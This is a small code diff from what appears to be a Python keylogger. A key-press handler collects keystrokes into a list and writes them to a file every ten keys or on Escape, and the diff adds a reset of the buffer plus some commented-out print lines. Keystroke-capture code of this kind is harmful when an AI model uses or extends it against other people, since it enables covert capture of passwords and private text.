@@ -19,10 +19,14 @@ def press(key):
         key = "\n"
     keys.append(key)
     count += 1
+    # print(keys, count)
     
     if count >= 10 or key == "esc":
         count = 0
+        # print(keys)
         write_file()
+        keys = []
+        # print(keys)
     # print(f"{key}")
 
 def write_file():
